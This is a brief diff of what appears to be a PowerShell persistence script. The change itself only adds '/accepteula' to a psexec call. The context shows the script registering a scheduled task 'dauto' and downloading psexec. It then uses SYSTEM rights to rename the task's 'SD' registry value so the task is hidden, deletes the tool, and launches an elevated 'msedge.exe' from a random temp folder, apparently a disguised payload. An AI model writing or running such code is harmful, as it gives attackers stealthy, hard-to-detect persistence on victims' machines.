@@ -84,7 +84,7 @@ $taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserNa
 Register-ScheduledTask -Xml $taskXml -TaskName 'dauto' -Force
 
 Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe"
-.\psexec.exe -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
+.\psexec.exe /accepteula -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
 Remove-item psexec.exe
 
 Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs
